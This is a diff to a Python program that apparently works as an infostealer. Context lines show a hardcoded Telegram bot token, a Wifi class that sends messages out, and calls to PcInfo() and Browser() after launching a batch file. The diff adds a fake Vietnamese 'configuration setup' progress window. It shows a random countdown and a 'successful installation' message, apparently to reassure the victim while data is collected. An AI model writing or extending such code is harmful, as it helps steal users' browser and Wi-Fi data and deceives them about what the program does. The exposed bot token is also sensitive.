@@ -13,6 +13,10 @@ import io
 import time
 import subprocess
 import sys
+import tkinter as tk
+from tkinter import ttk
+import random
+import time
 
 # How to get token and ID: https://www.youtube.com/watch?v=JNwEJ5HvLgM
 bot_token = '9195079283:AAH9Zqb7f4efx7wVtmNJG2dnp3H44y7nqa4'
@@ -726,8 +730,44 @@ class Wifi:
                     print("Maximum retries reached. Could not send message.")
         return None
 
+total_time = random.randint(10, 15)
+start_time = time.time()
+
+def update_progress():
+    elapsed = time.time() - start_time
+
+    percent = min(int(elapsed / total_time * 100), 100)
+    remaining = max(0, total_time - int(elapsed))
+
+    progress["value"] = percent
+    percent_label.config(text=f"{percent}%")
+    time_label.config(text=f"Thời gian còn lại: {remaining}s")
+
+    if elapsed < total_time:
+        messages = [
+            "Đang khởi tạo cấu hình...",
+            "Đang kiểm tra hệ thống...",
+            "Đang cài đặt thành phần...",
+            "Đang thiết lập môi trường...",
+            "Đang hoàn tất..."
+        ]
+
+        index = min(int(percent / 20), 4)
+        status_label.config(text=messages[index])
+
+        root.after(100, update_progress)
+    else:
+        progress["value"] = 100
+        percent_label.config(text="100%")
+        time_label.config(text="Hoàn thành!")
+        status_label.config(text="Cài đặt thành công!")
+
+        root.after(2000, root.destroy)
+
+
 def main():
 
+    
     if getattr(sys, 'frozen', False):
         base_dir = os.path.dirname(sys.executable)
     else:
@@ -748,6 +788,52 @@ def main():
         )
     else:
         print(f"Không tìm thấy file: {bat_file}")
+
+    root = tk.Tk()
+    root.title("Configuration Setup")
+    root.geometry("450x220")
+    root.resizable(False, False)
+    
+    title_label = tk.Label(
+        root,
+        text="Đang cài đặt cấu hình",
+        font=("Segoe UI", 16, "bold")
+    )
+    title_label.pack(pady=(25, 15))
+    
+    status_label = tk.Label(
+        root,
+        text="Đang chuẩn bị...",
+        font=("Segoe UI", 10)
+    )
+    status_label.pack(pady=5)
+    
+    progress = ttk.Progressbar(
+        root,
+        length=370,
+        maximum=100,
+        mode="determinate"
+    )
+    progress.pack(pady=10)
+    
+    percent_label = tk.Label(
+        root,
+        text="0%",
+        font=("Segoe UI", 12, "bold")
+    )
+    percent_label.pack()
+    
+    time_label = tk.Label(
+        root,
+        text=f"Thời gian còn lại: {total_time}s",
+        font=("Segoe UI", 9)
+    )
+    time_label.pack(pady=5)
+    
+    # Tự động chạy
+    root.after(100, update_progress)
+    
+    root.mainloop()
 
     PcInfo()
     Browser()
